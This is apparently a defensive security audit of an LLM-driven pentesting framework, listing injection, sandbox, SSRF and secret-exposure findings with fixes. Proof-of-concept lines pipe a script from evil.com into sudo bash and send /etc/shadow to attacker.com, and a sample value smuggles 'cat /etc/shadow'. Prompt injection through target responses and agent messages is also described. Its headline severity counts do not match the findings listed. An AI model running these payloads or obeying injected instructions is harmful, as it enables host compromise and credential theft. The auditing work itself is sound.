# PHANTOM — Deep Offensive Security Audit Report

**Date:** 2025-02-25
**Auditor:** Expert-level automated security analysis
**Scope:** Every file, every line of the `phantom` project
**Version Audited:** 0.9.1
**Classification:** CONFIDENTIAL

---

## Executive Summary

Phantom is an autonomous AI-powered penetration testing framework that executes security tools inside a Docker sandbox, orchestrated by LLM-driven agents. This audit examined **every Python module, Dockerfile, entrypoint script, configuration file, and dependency manifest** in the project.

### Aggregate Findings

| Severity | Count |
|----------|-------|
| **CRITICAL** | 17 |
| **HIGH** | 25 |
| **MEDIUM** | 28 |
| **LOW** | 15 |
| **TOTAL** | **85** |

### Risk Rating: **CRITICAL**

The system has **multiple independent paths to full host compromise** from an attacker who can influence LLM output (prompt injection), intercept agent communications, or supply malicious scan targets/configurations.

---

## Table of Contents

1. [Command Injection & Shell Execution](#1-command-injection--shell-execution)
2. [Arbitrary Code Execution](#2-arbitrary-code-execution)
3. [Prompt Injection & Agent Manipulation](#3-prompt-injection--agent-manipulation)
4. [Container & Sandbox Escape](#4-container--sandbox-escape)
5. [Server-Side Request Forgery (SSRF)](#5-server-side-request-forgery-ssrf)
6. [Path Traversal & File Access](#6-path-traversal--file-access)
7. [Secret & Credential Exposure](#7-secret--credential-exposure)
8. [Supply Chain & Dependency Risks](#8-supply-chain--dependency-risks)
9. [Authentication & Authorization Flaws](#9-authentication--authorization-flaws)
10. [Denial of Service & Resource Exhaustion](#10-denial-of-service--resource-exhaustion)
11. [Cryptographic & Protocol Weaknesses](#11-cryptographic--protocol-weaknesses)
12. [Logic Bugs & Race Conditions](#12-logic-bugs--race-conditions)
13. [Information Disclosure](#13-information-disclosure)
14. [Bandit/Linter Security Bypasses](#14-banditlinter-security-bypasses)

---

## 1. Command Injection & Shell Execution

### CRIT-01: Zero-Sanitization Terminal Command Execution
- **File:** `phantom/tools/terminal/terminal_actions.py` → `terminal_session.py:197,246`
- **CWE:** CWE-78 (OS Command Injection)
- **Description:** The `terminal_execute(command)` tool passes the `command` string **verbatim** to a live bash shell via tmux `pane.send_keys(command)`. There is **no allowlist, no blocklist, no escaping, no character filtering** whatsoever. Any string the AI agent generates (or an attacker influences via prompt injection) is executed as a full shell command.
- **Impact:** Arbitrary OS command execution as the `pentester` user, with `NOPASSWD:ALL` sudo → instant root.
- **PoC Scenario:** Attacker injects `"; curl http://evil.com/shell.sh | sudo bash"` into a target's HTTP response headers. The LLM parses it and passes it through as a terminal command.

### CRIT-02: `extra_args` Universal Backdoor in ALL Security Tool Wrappers
- **Files:**
  - `phantom/tools/security/ffuf_tool.py:79`
  - `phantom/tools/security/httpx_tool.py:75`
  - `phantom/tools/security/nmap_tool.py:95`
  - `phantom/tools/security/nuclei_tool.py:66`
  - `phantom/tools/security/sqlmap_tool.py:82`
  - `phantom/tools/security/subfinder_tool.py:37`
- **CWE:** CWE-78 (OS Command Injection)
- **Description:** Every security tool wrapper accepts an `extra_args` parameter that is processed via `shlex.split(extra_args)` then joined back into a command string via `" ".join(cmd_parts)`. While `shlex.split` tokenizes the string, the resulting tokens are **not individually quoted** with `shlex.quote()` before joining. This means shell metacharacters like `;`, `|`, `&&`, `` ` ``, `$()` survive tokenization and are interpreted by bash when the final command string is executed via `terminal_execute`.
- **Impact:** Arbitrary command injection through any tool's `extra_args` parameter.
- **PoC:** `extra_args="-v; curl attacker.com/exfil?data=$(cat /etc/shadow)"` → the `;` splits the command.

### CRIT-03: Heredoc Injection in httpx Target List
- **File:** `phantom/tools/security/httpx_tool.py:54-58`
- **CWE:** CWE-78
- **Description:** Target URLs are embedded in a heredoc:
  ```bash
  cat > /tmp/httpx_targets.txt <<'PHANTOM_EOF'
  {targets_str}
  PHANTOM_EOF
  ```
  If any target URL contains the literal string `PHANTOM_EOF`, the heredoc terminates early and **all subsequent text is executed as shell commands**.
- **Impact:** An attacker who controls DNS records or HTTP redirects can inject a target URL containing `PHANTOM_EOF\nmalicious_command` to achieve command execution.

### CRIT-04: Command Injection via Interactsh Server Parameter
- **File:** `phantom/core/interactsh_client.py:107,207`
- **CWE:** CWE-78
- **Description:** `self.server` is user-controllable and directly interpolated into shell commands without sanitization: `cmd = f"interactsh-client -server {self.server} ..."`. Injection via the server parameter is trivial.

### CRIT-05: Unquoted Parameters in SQLMap
- **File:** `phantom/tools/security/sqlmap_tool.py:115-120`
- **CWE:** CWE-78
- **Description:** In `sqlmap_dump_database`, the `database`, `table`, and `columns` values are passed via `cmd_parts.extend(["-D", database, "-T", table])` **without** `shlex.quote()`. A malicious database name like `test; cat /etc/shadow` injects shell commands.

---

## 2. Arbitrary Code Execution

### CRIT-06: Unrestricted Python Execution via IPython
- **File:** `phantom/tools/python/python_instance.py:107-111`
- **CWE:** CWE-94 (Code Injection)
- **Description:** `self.shell.run_cell(code)` executes **arbitrary Python code** in an unrestricted IPython shell — no AST analysis, no import restrictions, no sandboxing. The executed code has process-level access to:
  - `os`, `subprocess`, `socket` for shell commands and network access
  - All environment variables including API keys and sandbox tokens
  - The filesystem (read/write arbitrary files)
  - Proxy functions injected into the namespace (see CRIT-07)

### CRIT-07: Proxy Function Injection into IPython Namespace
- **File:** `phantom/tools/python/python_instance.py:31-47`
- **CWE:** CWE-94
- **Description:** `_setup_proxy_functions()` injects privileged proxy action functions (`send_request`, `repeat_request`, etc.) directly into the IPython user namespace. Any code running in the shell has unauthenticated access to these functions.

### CRIT-08: Arbitrary Plugin Code Execution Without Verification
- **File:** `phantom/core/plugin_loader.py:112-129`
- **CWE:** CWE-94
- **Description:** `exec_module()` runs arbitrary `.py` files from the plugin directory with full process privileges. No signature verification, no checksum validation, no allowlisting. Though gated behind `PHANTOM_ENABLE_PLUGINS=1`, when enabled, any file in the plugin directory executes as the process owner.

### HIGH-01: Arbitrary JavaScript Execution in Browser
- **Files:** `phantom/tools/browser/browser_actions.py:148-151`, `browser_instance.py:370-385`
- **CWE:** CWE-94
- **Description:** The `execute_js` action passes `js_code` directly to Playwright's `page.evaluate()`, enabling arbitrary JavaScript execution in the browser context — cookie theft, localStorage access, DOM manipulation.

### HIGH-02: Jinja2 Autoescaping Disabled (SSTI Risk)
- **Files:** `phantom/agents/base_agent.py:43`, `phantom/llm/llm.py:79-82`
- **CWE:** CWE-917 (Server-Side Template Injection)
- **Description:** Jinja2 autoescaping is explicitly disabled: `autoescape=select_autoescape(enabled_extensions=(), default_for_string=False)`. If any user-controllable data flows into template variables, SSTI → arbitrary code execution.

---

## 3. Prompt Injection & Agent Manipulation

### CRIT-09: Prompt Injection via Inter-Agent Messages
- **File:** `phantom/agents/base_agent.py:466-502`
- **CWE:** CWE-77 (Command Injection — prompt context)
- **Description:** `_check_agent_messages()` takes unsanitized content from other agents — including `sender_name`, `sender_id`, and `message["content"]` — and injects it directly into XML that becomes part of the LLM conversation. A compromised or manipulated agent can inject arbitrary instructions into another agent's prompt, overriding security constraints or scan scope rules.

### CRIT-10: Prompt Injection via User Instructions
- **File:** `phantom/agents/PhantomAgent/phantom_agent.py:95`
- **CWE:** CWE-74
- **Description:** `user_instructions` from `scan_config` is concatenated directly into the LLM task description: `task_description += f"\n\nSpecial instructions: {user_instructions}"`. An attacker-controlled instruction string can override system prompt guardrails.

### HIGH-03: Skill Content as Prompt Injection Vector
- **File:** `phantom/agents/PhantomAgent/phantom_agent.py:86-95`
- **CWE:** CWE-74
- **Description:** Scan profile fields (`profile_name`, `skip_tools`, `priority_tools`) and skill Markdown files are interpolated into the LLM prompt without sanitization. Custom profiles registered via `register_profile()` could inject malicious instructions.

---

## 4. Container & Sandbox Escape

### CRIT-11: Passwordless Sudo in Sandbox Container
- **File:** `containers/Dockerfile:11`
- **CWE:** CWE-269 (Improper Privilege Management)
- **Description:** `echo "pentester ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers` gives the `pentester` user **unconditional root access**. Combined with the zero-sanitization command execution (CRIT-01), any AI-generated command can escalate to root with `sudo`.
- **Impact:** Total container compromise. Root inside container enables:
  - Writing to host-mounted volumes
  - Network attacks against the host via `host.docker.internal`
  - Potential container escape via kernel exploits (container has `NET_ADMIN` + `NET_RAW` capabilities)

### CRIT-12: Excessive Container Capabilities
- **File:** `phantom/runtime/docker_runtime.py:148`
- **CWE:** CWE-250 (Execution with Unnecessary Privileges)
- **Description:** Container is launched with `cap_add=["NET_ADMIN", "NET_RAW"]`. `NET_ADMIN` allows modifying network interfaces, routing tables, iptables rules, and ARP tables. Combined with passwordless sudo, this enables:
  - ARP spoofing attacks against the host network
  - Network traffic interception
  - Potential container escape via network namespace manipulation

### HIGH-04: Browser Launched with `--disable-web-security`
- **File:** `phantom/tools/browser/browser_instance.py:68-73`
- **CWE:** CWE-346 (Origin Validation Error)
- **Description:** Chrome is launched with `--disable-web-security` which **disables the Same-Origin Policy**. Any page loaded can read data from any other origin. Combined with `--no-sandbox` (disabling Chrome's own sandbox), a browser exploit would directly compromise the container.

### HIGH-05: Tool Server Binds to 0.0.0.0
- **File:** `containers/docker-entrypoint.sh:177`, `phantom/runtime/tool_server.py:26`
- **CWE:** CWE-284 (Improper Access Control)
- **Description:** The tool server binds to `0.0.0.0` inside the container. If Docker port mapping is misconfigured, or the container is on a shared network, the tool server is accessible from other containers or the broader network.

### HIGH-06: `curl | sh` Pattern During Build
- **Files:** `containers/Dockerfile:78,112,116`
- **CWE:** CWE-494 (Download of Code Without Integrity Check)
- **Description:** Multiple instances of downloading and piping scripts directly to shell:
  ```
  curl -sSL https://install.python-poetry.org | python3 -
  curl -sSfL https://raw.githubusercontent.com/.../install.sh | sh
  curl -sfL https://raw.githubusercontent.com/aquasecurity/trivy/.../install.sh | sh
  ```
  No checksum verification. A compromised upstream or MITM attack during build injects arbitrary code.

### HIGH-07: Unpinned Base Image
- **File:** `containers/Dockerfile:1`
- **CWE:** CWE-1104 (Use of Unmaintained Third Party Components)
- **Description:** `FROM kalilinux/kali-rolling:latest` — no digest pinning. Supply chain attacks via image replacement are possible. Should use `kalilinux/kali-rolling@sha256:...`.

### HIGH-08: Excessive nmap Capabilities
- **File:** `containers/Dockerfile:50`
- **CWE:** CWE-250
- **Description:** `setcap cap_net_raw,cap_net_admin,cap_net_bind_service+eip $(which nmap)` — nmap gets `cap_net_bind_service` (bind to any port) and `cap_net_admin`, which is far more than raw socket access needed for SYN scans.

### HIGH-09: Unverified Git Clones
- **Files:** `containers/Dockerfile:101-107`
- **CWE:** CWE-494
- **Description:** Three repositories are cloned without pinning to specific commits:
  ```
  git clone https://github.com/aravind0x7/JS-Snooper.git
  git clone https://github.com/xchopath/jsniper.sh.git
  git clone https://github.com/ticarpi/jwt_tool.git
  ```
  A compromised GitHub account would inject malicious code into the sandbox.

### MEDIUM-01: CA Private Key Exposure
- **File:** `containers/Dockerfile:51-62`
- **Description:** The CA private key is generated and stored at `/app/certs/ca.key` inside the container. While permissions are set to 600, any code running as `pentester` (with sudo) can read it. This key can generate trusted certificates for MITM attacks beyond the intended testing scope.

### MEDIUM-02: Token in Environment Variables
- **File:** `containers/docker-entrypoint.sh:77,127-140`
- **Description:** The Caido API token and tool server token are stored in environment variables and written to `/etc/environment` and `/etc/profile.d/proxy.sh`. Any process in the container can read them via `/proc/self/environ`.

---

## 5. Server-Side Request Forgery (SSRF)

### HIGH-10: Unrestricted SSRF via Proxy Manager
- **File:** `phantom/tools/proxy/proxy_manager.py:214-227`
- **CWE:** CWE-918 (SSRF)
- **Description:** `send_simple_request()` makes HTTP requests to **arbitrary URLs** via `requests.request(method, url, ...)`. No URL allowlist/denylist. Can be used to access:
  - Cloud metadata endpoints (`http://169.254.169.254/`)
  - Internal services via `host.docker.internal`
  - Localhost services

### HIGH-11: SSRF in Verification Engine
- **File:** `phantom/core/verification_engine.py:150-158,440-458`
- **CWE:** CWE-918
- **Description:** The verification engine constructs URLs from vulnerability records (potentially LLM-generated) and makes HTTP requests without scope validation.

### HIGH-12: DNS Rebinding in Webhook URL Validation
- **File:** `phantom/core/notifier.py:35-55`
- **CWE:** CWE-367, CWE-918
- **Description:** `_validate_url()` resolves DNS and checks for private IPs, but a time-of-check-to-time-of-use gap allows DNS rebinding attacks. Also: the comment says "Only allow https" but the code also allows `http`.

### HIGH-13: SSRF via `_is_http_git_repo`
- **File:** `phantom/interface/utils.py:441`
- **CWE:** CWE-918
- **Description:** Makes HTTP requests to user-supplied URLs to detect Git repositories. No validation against internal addresses.

### MEDIUM-03: No URL Scheme Validation in Browser
- **Files:** `phantom/tools/browser/browser_actions.py:82-85`, `browser_instance.py:147,199`
- **CWE:** CWE-918
- **Description:** `page.goto(url)` accepts any URL without scheme validation. `file:///`, `javascript:`, `data:` URIs can read local files or execute code.

---

## 6. Path Traversal & File Access

### HIGH-14: Path Traversal in File Edit Tools
- **File:** `phantom/tools/file_edit/` (multiple files)
- **CWE:** CWE-22 (Path Traversal)
- **Description:** File edit tools accept absolute paths and paths with `../` that escape the `/workspace` boundary. No jail enforcement.

### HIGH-15: Path Traversal in Browser PDF Save
- **File:** `phantom/tools/browser/browser_instance.py:548-551`
- **CWE:** CWE-22
- **Description:** `_save_pdf(file_path)` only validates non-emptiness and absolute vs. relative. Relative paths with `../../` can escape `/workspace`.

### HIGH-16: Path Traversal in Multiple Core Components
- **Files:**
  - `phantom/core/knowledge_store.py:44` — `store_path` used directly with `mkdir(parents=True)`
  - `phantom/core/diff_scanner.py:94-95` — `baseline_path`/`current_path` unvalidated
  - `phantom/core/plugin_loader.py:70` — `plugin_dir` used to glob for Python files
  - `phantom/core/nuclei_templates.py:54` — `output_dir` creates directories and writes files
- **CWE:** CWE-22
- **Description:** All accept user-controllable paths without canonicalization or jail enforcement.

### MEDIUM-04: `sanitize_name` Allows `..`
- **File:** `phantom/interface/utils.py:543`
- **Description:** The `sanitize_name` function strips some characters but allows `..`, enabling directory traversal in filenames.

### MEDIUM-05: Predictable Temporary File Paths
- **Files:**
  - `phantom/tools/security/ffuf_tool.py:70` — `/tmp/ffuf_out.json`
  - `phantom/tools/security/httpx_tool.py:54` — `/tmp/httpx_targets.txt`
  - Various `/tmp/*.json` patterns
- **CWE:** CWE-377 (Insecure Temporary File)
- **Description:** Hardcoded `/tmp/` paths enable symlink attacks by other processes in the container.

---

## 7. Secret & Credential Exposure

### HIGH-17: API Key Leakage in Error Paths
- **Files:** `phantom/llm/llm.py:117-127`, `phantom/llm/dedupe.py:151-161`
- **CWE:** CWE-209, CWE-798
- **Description:** API keys are passed to litellm. If litellm raises exceptions with request details, the API key appears in `str(e)`, which flows to error logs, `state.errors`, and dedupe return values.

### HIGH-18: Sandbox Token in Plaintext State
- **Files:** `phantom/agents/state.py:16,120-138`, `base_agent.py:126`
- **CWE:** CWE-312 (Cleartext Storage of Sensitive Information)
- **Description:** `sandbox_token` is stored as plain text in `AgentState`, serialized via `model_dump()`, and exposed through `get_execution_summary()`.

### HIGH-19: API Key in CLI Error Messages
- **File:** `phantom/interface/main.py:281`
- **CWE:** CWE-209
- **Description:** Error messages that may contain API keys are displayed to the user.

### MEDIUM-06: Git URL Credential Pass-Through
- **File:** `phantom/interface/utils.py:462-464`
- **Description:** Embedded credentials in Git URLs (e.g., `https://user:pass@github.com/...`) are accepted silently and passed to `git clone`.

### MEDIUM-07: Incomplete Audit Log Sanitization
- **File:** `phantom/core/audit_logger.py:319-336`
- **CWE:** CWE-532
- **Description:** `_sanitize_args` only redacts values matching known sensitive key names. Secrets under generic keys like `"data"`, `"config"`, `"value"` are logged in plaintext.

### MEDIUM-08: Config File Permissions Race
- **File:** `phantom/config/config.py:109-111`
- **Description:** `Config.save()` writes the config file then `chmod(0o600)` — there's a window where the file has default (potentially world-readable) permissions. Should use `os.open()` with `O_CREAT` + restricted mode.

---

## 8. Supply Chain & Dependency Risks

### HIGH-20: Wildcard Version Pinning
- **File:** `pyproject.toml:55,68,69`
- **CWE:** CWE-1104
- **Description:** Critical dependencies use wildcard versions:
  ```toml
  rich = "*"
  fastapi = { version = "*", optional = true }
  uvicorn = { version = "*", optional = true }
  ```
  Any malicious release of these packages would be automatically installed.

### HIGH-21: `@latest` Tags in Go/npm Installs
- **Files:** `containers/Dockerfile:84-88,92-95,97-99`
- **Description:** `go install ...@latest`, `pipx install ...`, and `npm install -g ...@latest` all pull the latest version without pinning. A supply chain compromise would inject code into the sandbox.

### MEDIUM-09: Mutable GitHub Action Tags
- **File:** `.github/workflows/*.yml`
- **Description:** GitHub Actions likely use mutable tags (`@v3`, `@v4`) instead of SHA pinning, enabling tag-reassignment attacks.

### MEDIUM-10: No SBOM or Vulnerability Scanning
- **Description:** No evidence of container image scanning, SBOM generation, or dependency vulnerability scanning in CI/CD.

---

## 9. Authentication & Authorization Flaws

### HIGH-22: TLS Verification Disabled in Proxy
- **File:** `phantom/tools/proxy/proxy_manager.py:224`
- **CWE:** CWE-295 (Improper Certificate Validation)
- **Description:** `verify=False` in `requests.request()` disables SSL/TLS verification. All HTTPS requests are vulnerable to MITM attacks.

### HIGH-23: No Authentication on Agent Graph Access
- **File:** `phantom/agents/base_agent.py:113-136`
- **CWE:** CWE-862 (Missing Authorization)
- **Description:** The `agents_graph_actions` module is accessible without authentication. Any code can read all agent states (including sandbox tokens), modify the agent graph, and send messages to any agent.

### MEDIUM-11: Tool Server Health Endpoint Unauthenticated
- **File:** `phantom/runtime/tool_server.py` — `/health` endpoint
- **CWE:** CWE-306
- **Description:** The `/health` endpoint requires no authentication and reveals:
  - Sandbox mode status
  - Number of active agents
  - Environment type

### MEDIUM-12: Unrestricted `config set` Command
- **File:** `phantom/interface/cli_app.py:536`
- **Description:** The `phantom config set` CLI command can set any tracked environment variable without validation, including `PHANTOM_IMAGE` (pointing to a malicious container image).

---

## 10. Denial of Service & Resource Exhaustion

### MEDIUM-13: Unbounded Memory Growth in Agent State
- **File:** `phantom/agents/state.py:33-38`, `enhanced_state.py:38-43`
- **CWE:** CWE-400
- **Description:** `messages`, `actions_taken`, `observations`, `errors` lists grow without bound. The memory compressor caps messages at 200 but only when explicitly invoked. Long-running scans (up to 300 iterations) accumulate thousands of entries.

### MEDIUM-14: ReDoS via Scope Regex
- **File:** `phantom/core/scope_validator.py:69-81`
- **CWE:** CWE-1333
- **Description:** User-supplied regex patterns are compiled without complexity analysis. Catastrophic backtracking patterns (e.g., `(a+)+$`) can freeze the process.

### MEDIUM-15: ReDoS via Proxy Search
- **File:** `phantom/tools/proxy/proxy_manager.py:148-152`
- **CWE:** CWE-1333
- **Description:** `re.compile(pattern, ...)` compiles user-provided patterns without protection against CPU-exhausting patterns.

### MEDIUM-16: Thread Non-Termination on Python Execution Timeout
- **File:** `phantom/tools/python/python_instance.py:118-122`
- **CWE:** CWE-400
- **Description:** When Python code execution times out, the daemon thread continues running indefinitely. There's no mechanism to kill the thread or its code. Timed-out code continues consuming CPU/memory and potentially performing malicious actions.

### MEDIUM-17: Audit Log Stats Unbounded Read
- **File:** `phantom/core/audit_logger.py:263`
- **Description:** `get_stats()` reads up to 100,000 log entries into memory.

### LOW-01: Synchronous LLM Call Blocks Event Loop
- **File:** `phantom/llm/memory_compressor.py:102`
- **Description:** `litellm.completion()` (synchronous) can block the event loop for up to 30 seconds when called from async context.

---

## 11. Cryptographic & Protocol Weaknesses

### MEDIUM-18: Vulnerability ID Hash Collision Risk
- **File:** `phantom/models/vulnerability.py:170`
- **CWE:** CWE-328
- **Description:** `hashlib.sha256(...).hexdigest()[:12]` = 48 bits of entropy. Birthday paradox gives ~1% collision probability at ~16 million items. Collisions silently overwrite vulnerability records.

### MEDIUM-19: CA Certificate Empty Passphrase
- **File:** `containers/Dockerfile:61`
- **Description:** `openssl pkcs12 -export ... -passout pass:""` — PKCS12 exported with empty passphrase. Any code that obtains the file can immediately use the CA key.

### LOW-02: Hardcoded User-Agent Fingerprinting
- **File:** `phantom/tools/browser/browser_instance.py:132-135`
- **Description:** Hardcoded user-agent string is easily fingerprinted by target defenders.

---

## 12. Logic Bugs & Race Conditions

### MEDIUM-20: Race Condition on `_force_stop` Flag
- **File:** `phantom/agents/base_agent.py:85,154,599`
- **CWE:** CWE-362
- **Description:** `_force_stop` is a plain boolean read/written from multiple async contexts and threads without synchronization.

### MEDIUM-21: Process-Wide `os.chdir()` Race
- **File:** `phantom/tools/python/python_instance.py:24`
- **CWE:** CWE-362
- **Description:** `os.chdir("/workspace")` in Python execution changes the **process-wide** working directory, affecting all concurrent threads/sessions.

### MEDIUM-22: Conversation History Mutation During Compression
- **File:** `phantom/llm/llm.py:99-103`
- **CWE:** CWE-662
- **Description:** `compress_history` mutates the caller's list in-place. If compression fails midway, history is in a partially destroyed state.

### MEDIUM-23: Session Create Holds Lock During Code Execution
- **File:** `phantom/tools/python/python_manager.py:45-55`
- **CWE:** CWE-667
- **Description:** `create_session` holds `self._lock` while executing `initial_code`, blocking all other session operations. Slow or malicious code causes DoS.

### LOW-03: TOCTOU in Terminal Command Execution
- **File:** `phantom/tools/terminal/terminal_session.py:228-250`
- **Description:** Checks if a command is running, then sends a new command — separate operations without atomicity.

### LOW-04: Stdout/Stderr Redirect Race
- **File:** `phantom/tools/python/python_instance.py:100-120`
- **Description:** `sys.stdout`/`sys.stderr` are redirected globally. A timeout can leave them permanently redirected.

---

## 13. Information Disclosure

### MEDIUM-24: Raw Terminal Output Returned
- **File:** `phantom/tools/terminal/terminal_session.py:103-106`
- **CWE:** CWE-200
- **Description:** Raw terminal output (including `/etc/passwd` contents, environment variables, secrets) is returned to the AI agent and ultimately to the user or logs.

### MEDIUM-25: CSV Injection in Vulnerability Export
- **File:** `phantom/telemetry/tracer.py:400`
- **CWE:** CWE-1236
- **Description:** Vulnerability data exported to CSV format without sanitizing cells that begin with `=`, `+`, `-`, `@`. Opening in Excel executes injected formulas.

### MEDIUM-26: Markdown Injection in Reports
- **File:** `phantom/telemetry/tracer.py:345`, `phantom/interface/cli_app.py:298`
- **Description:** Vulnerability descriptions and agent output are embedded in Markdown reports without sanitization. This enables injection of malicious links, images (for tracking), or XSS if rendered in a web context.

### LOW-05: Predictable Session Naming
- **File:** `phantom/tools/terminal/terminal_session.py:66`
- **Description:** Session names use `phantom-{session_id}-{uuid}` prefix, revealing application identity.

### LOW-06: Full Error Context in Tool Responses
- **Files:** `phantom/tools/terminal/terminal_manager.py:55-66`, `verification_actions.py:52`
- **Description:** Full `OSError` details returned to callers, leaking internal paths and system info.

---

## 14. Bandit/Linter Security Bypasses

### HIGH-24: Critical Bandit Rules Deliberately Skipped
- **File:** `pyproject.toml:374`
- **CWE:** CWE-1127 (Compilation with Insufficient Warnings)
- **Description:** The Bandit configuration skips these security rules:
  ```toml
  skips = ["B101", "B601", "B404", "B603", "B607"]
  ```
  - **B601**: `shell=True` in subprocess calls — **the primary shell injection rule**
  - **B603**: Subprocess without shell check
  - **B607**: Starting a process with a partial path
  This means the security linter is deliberately blinded to the exact vulnerability classes that plague this codebase (CWE-78).

### HIGH-25: Ruff Ignores S301 (Pickle), S104 (Bind All), S301
- **File:** `pyproject.toml:230-232`
- **Description:** Ruff is configured to ignore:
  - `S301` — Use of `pickle` (deserialization attacks)
  - `S104` — Binding to `0.0.0.0`
  These are real security issues in this codebase.

### MEDIUM-27: Test Security Rules Suppressed
- **File:** `pyproject.toml:254-260`
- **Description:** Tests suppress `S106` (hardcoded passwords) and `S108` (insecure temp files) — preventing detection of test credential leaks.

---

## Systemic Architectural Issues

### Issue A: No Defense-in-Depth
The entire architecture relies on the AI agent behaving correctly. There is **no command allowlist, no dangerous-command blocklist, no sandboxing boundary** between the tool execution layer and the OS. The only barrier between "LLM generates text" and "arbitrary OS command executes as root" is the hope that the model doesn't hallucinate or get prompt-injected.

### Issue B: Implicit Trust in LLM Output
Every tool that accepts parameters from the LLM (terminal commands, Python code, JavaScript code, URLs, file paths, SQL queries, regex patterns) passes them through with minimal or no validation. A single successful prompt injection against the AI agent immediately escalates to full system compromise via any of the ~15 tool categories.

### Issue C: Sandbox Is Not Actually a Security Boundary
The "sandbox" container provides:
- Passwordless sudo (CRIT-11)
- `NET_ADMIN` + `NET_RAW` capabilities (CRIT-12)
- Chrome with disabled security features (HIGH-04)
- Full network access to the host via `host.docker.internal`
- An unauthenticated internal API (tool server)

This means the container is not a security boundary but merely an execution environment. Any exploit inside the container has effective access to the host network and can potentially escape the container.

### Issue D: `extra_args` Is a Universal Escape Hatch
Every security tool wrapper (nmap, ffuf, httpx, nuclei, sqlmap, subfinder) accepts `extra_args`. Since the LLM is told about this parameter, a prompt injection can always add `;malicious_command` via `extra_args` to any tool invocation.

### Issue E: No Input Sanitization Layer
There is no centralized input sanitization layer. Each tool independently (and inconsistently) handles input validation. Some use `shlex.quote()` for some parameters but not others. No tool validates that inputs don't contain shell metacharacters before passing them to `terminal_execute`.

---

## Priority Remediation Roadmap

### Phase 1 — Immediate (Week 1): Stop the Bleeding
1. **Remove `NOPASSWD:ALL`** from the sandbox Dockerfile — use a whitelist of specific commands needing sudo
2. **Add `shlex.quote()` to EVERY parameter** in all security tool wrappers (not just some of them)
3. **Remove `extra_args` parameter** entirely from all security tools, or implement strict allowlist-based argument validation
4. **Fix heredoc injection** in httpx by using a random EOF marker or writing via `tee` without heredoc
5. **Sanitize interactsh server parameter** with URL validation
6. **Drop `NET_ADMIN` capability** — only `NET_RAW` is needed for SYN scans

### Phase 2 — Short Term (Week 2-3): Harden the Sandbox
7. **Implement command allowlist** in `terminal_execute` — block dangerous patterns like `sudo`, `chmod`, `rm -rf /`, reverse shells
8. **Add URL scheme validation** in browser tools — only allow `http://` and `https://`
9. **Enforce `/workspace` jail** for all file operations — canonicalize paths and reject anything outside
10. **Add SSRF protection** — block requests to RFC 1918 addresses, link-local, and cloud metadata endpoints
11. **Pin all dependency versions** — replace `*` with specific versions in pyproject.toml
12. **Pin base images** with SHA256 digests

### Phase 3 — Medium Term (Month 2): Defense in Depth
13. **Implement centralized input sanitization** — all tool parameters pass through a validation layer before shell execution
14. **Add prompt injection detection** — scan incoming LLM responses for injection patterns before executing
15. **Redact secrets from error messages** — strip API keys from all error paths  
16. **Add integrity verification** for plugins — require signatures or checksums
17. **Enable security linter rules** — remove B601, B603, B607 from Bandit skip list
18. **Implement rate limiting** in tool server and proxy
19. **Add authentication to agent graph** — require tokens for inter-agent communication

### Phase 4 — Long Term (Quarter 2): Architecture Improvements
20. **Separate privilege domains** — tool server should not run as same user as executed tools
21. **Implement seccomp profiles** for the sandbox container
22. **Add AppArmor/SELinux profiles** to further restrict container capabilities
23. **Implement audit trail integrity** — sign audit log entries
24. **Add network policies** — restrict container-to-host communication to specific ports
25. **Implement supply chain security** — SBOM generation, Sigstore signing, provenance attestation

---

## Conclusion

Phantom v0.9.1 presents **17 CRITICAL** and **25 HIGH** severity vulnerabilities across its attack surface. The most dangerous finding is the combination of:

1. Zero-sanitization command execution (CRIT-01)
2. Passwordless sudo in the sandbox (CRIT-11)
3. The `extra_args` universal injection vector (CRIT-02)
4. No defense against prompt injection (CRIT-09, CRIT-10)

Together, these create a scenario where a **single prompt injection attack** — achievable by a malicious target's web page content, HTTP response headers, or DNS records — can escalate to **root access inside the sandbox container** with minimal attacker effort.

The sandbox container provides no real security boundary due to excessive privileges, making the entire system's security posture dependent on the LLM never generating a malicious command — a guarantee no current AI model can provide.

**Risk Rating: CRITICAL — The system should not be deployed in production without addressing at least Phase 1 remediations.**
